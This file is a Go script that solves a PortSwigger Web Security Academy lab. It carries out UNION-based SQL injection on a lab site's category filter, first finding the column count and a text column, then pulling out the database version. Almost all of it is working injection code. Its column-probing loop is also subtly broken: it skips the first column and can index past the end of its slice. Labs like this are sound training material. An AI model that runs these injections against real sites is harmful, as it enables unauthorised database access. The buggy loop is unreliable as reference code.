// https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0aeb00130451dd58c0b226e3002900c9.web-security-academy.net"
	filterUrl := u + "/filter"

	numCols, err := numColumns(filterUrl, client)
	if err != nil {
		return err
	}
	fmt.Println("Number of columns:", numCols)

	textCol, err := textColumn(filterUrl, numCols, client)
	if err != nil {
		return err
	}
	fmt.Println("Text column index:", textCol)

	vers, err := fetchVersion(filterUrl, numCols, textCol, client)
	if err != nil {
		return err
	}
	fmt.Println("Database version:", vers)
	return nil
}

func numColumns(u string, client *http.Client) (int, error) {
	for i := 1; i <= 5; i++ {
		nulls := make([]string, i)
		for j := 0; j < len(nulls); j++ {
			nulls[j] = "null"
		}

		filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select "+strings.Join(nulls, ",")+"-- ")
		fmt.Println(filterUrl)
		resp, err := client.Get(filterUrl)
		if err != nil {
			return 0, err
		}
		defer resp.Body.Close()
		if resp.StatusCode/100 == 2 {
			return i, nil
		}
	}
	return 0, fmt.Errorf("could not find out number of columns")
}

func textColumn(u string, max int, client *http.Client) (int, error) {
	for i := 1; i <= max; i++ {
		nulls := make([]string, max)
		for j := 0; j < len(nulls); j++ {
			nulls[j] = "null"
		}
		nulls[i] = "'a'"

		filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select "+strings.Join(nulls, ",")+"-- ")
		fmt.Println(filterUrl)
		resp, err := client.Get(filterUrl)
		if err != nil {
			return 0, err
		}
		defer resp.Body.Close()
		if resp.StatusCode/100 == 2 {
			return i, nil
		}
	}
	return 0, fmt.Errorf("text column not found")
}

var versionRE *regexp.Regexp = regexp.MustCompile(`>@@([^@<>]+)@@<`)

func fetchVersion(u string, numCols, textCol int, client *http.Client) (string, error) {
	nulls := make([]string, numCols)
	for j := 0; j < len(nulls); j++ {
		nulls[j] = "null"
	}
	nulls[textCol] = "concat('@@',@@version,'@@')"

	filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select "+strings.Join(nulls, ",")+"-- ")
	fmt.Println(filterUrl)
	resp, err := client.Get(filterUrl)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return "", fmt.Errorf("Status: %v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	fmt.Println(string(body))

	m := versionRE.FindSubmatch(body)
	if len(m) != 2 {
		return "", fmt.Errorf("version not found")
	}
	return string(m[1]), nil
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{Jar: jar}, nil
}
